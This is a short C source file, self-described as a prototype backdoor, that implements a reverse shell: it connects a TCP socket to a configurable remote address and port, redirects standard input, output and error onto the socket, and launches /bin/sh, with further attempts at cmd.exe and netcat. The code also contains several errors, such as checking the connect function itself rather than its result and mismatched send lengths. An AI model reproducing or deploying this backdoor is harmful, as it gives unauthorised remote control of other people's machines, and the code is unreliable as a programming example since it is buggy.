/* prototype of backdoor wopnt. */ 

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>
#include <sys/types.h>

#define remote_addr "127.0.0.1"

#define remote_port 55661

#define false 0
#define true 1

  void shell()

  {

    int x;
    struct sockaddr_in s;

    s.sin_family = AF_INET;
    s.sin_addr.s_addr = inet_addr(remote_addr);
    s.sin_port = htons(remote_port);
    memset(s.sin_zero, '\0', sizeof s.sin_zero);

    x = socket(AF_INET, SOCK_STREAM, 0);

    connect(x, (struct sockaddr *)&s, sizeof(s));
    if(connect == false)
    perror("connect_socket(CONNECT_STABILISHED)failed");

    if (setsockopt(x, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)) < 0)
    perror("setsockopt(SO_REUSEADDR) failed");

    /* mm a for loop will be necessary, or switch case. */

    send(x,"\nConnected\n",12,0),send(x,"\n#root > /n",7,0);   /* recv(); no lado server. */

    dup2(x, 0),dup2(x, 1),dup2(x, 2);
    execve("/bin/sh", 0, 0),execve("C:\\windows\\System32\\cmd.exe ", 0, 0),execve("netcat", 0, 0);

    {

    return shell;

    }

}

   /* execute the program */

   int main(int argc, char *argv[])

   {
     
     char option;

     //printf("\nLaunch the shell\n");
     //scanf("%s",&option);
     //printf("%s",&option);

     option = 's'; //allready determined the answer ;)

     switch(option)

     {

      case 's':

           shell();

    }


}
